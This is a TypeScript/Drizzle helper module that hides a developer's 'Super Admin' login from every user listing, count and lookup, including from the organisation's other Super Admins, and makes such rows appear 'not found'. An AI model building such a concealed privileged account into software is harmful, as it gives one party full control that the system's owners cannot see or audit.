import { eq } from 'drizzle-orm';
import { users } from './db/schema';

/**
 * Hidden logins (users.hidden): the developer's Super Admin. It works like any
 * Super Admin, but it is not a person in the organisation, so it never shows up
 * where people are listed, counted or picked — not even to other Super Admins.
 *
 * Every query that lists people adds `notHidden` to its where clause. Lookups
 * of one row by id don't need it (the developer has to load their own row);
 * screens that open someone by id use `hiddenFrom` to answer "not found".
 */
export const notHidden = eq(users.hidden, false);

/** True when `viewerId` must not see or act on this row. */
export function hiddenFrom(viewerId: string, target: { id: string; hidden: boolean } | null | undefined): boolean {
	return Boolean(target?.hidden && target.id !== viewerId);
}
